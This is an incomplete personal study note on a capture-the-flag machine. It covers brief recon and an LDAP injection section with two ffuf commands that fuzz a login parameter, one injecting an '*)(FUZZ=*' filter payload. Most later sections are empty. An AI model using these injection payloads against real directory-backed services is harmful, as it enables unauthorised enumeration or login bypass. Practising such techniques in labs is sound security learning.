# CTF Helped-Through

Name: CTF
Date:  
Difficulty:  Insane
Goals:  
- LDAP Injection Attack revised, understood and noted in my Archive
- Adapt the script a team had to suit new attack scenarios
Learnt:
Beyond Root:
- Adapt the script
- LDAP page in Archive complete

- [[CTF-Notes.md]]
- [[CTF-CMD-by-CMDs.md]]

One of the season 4 machine contains this exploit I want to solidify and revise my understanding of this because will trying to do this manually I failed with online resources that were not mine. I will do the usual recon with the exploit in mind for the first hour the follow along. [IppSec](https://www.youtube.com/watch?v=51JQg202csw) is awesome.
## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128. This machine has rate limiting protections and blacklisting IP to prevent content discovery tools and scanning 
![ping](Screenshots/ping.png)

`/manual/`  from `feroxbuster`, and the `login.php` and `status.php` pages found by `gospider` look interesting.
## Exploit

```bash
# LDAP-active-directory-attributes.txt
# LDAP-active-directory-classes.txt
# LDAP-openldap-attributes.txt
# LDAP-openldap-classes.txt
# LDAP.Fuzzing.txt

ffuf -u 'http://ctf.htb/param=FUZZ*' -c -w /usr/share/seclists/Fuzzing/chars.txt:FUZZ  -mc all


ffuf -u 'http://ctf.htb/param=*)(FUZZ=*' -c -w /usr/share/seclists/Fuzzing/$LDAPWORDLIST:FUZZ -mc all -x http://127.0.0.1:8080 # remember to apply FFUF filters and have burpsuite running
```


## Foothold

## Privilege Escalation

## Post-Root-Reflection  

![](CTF-map.excalidraw.md)

## Beyond Root


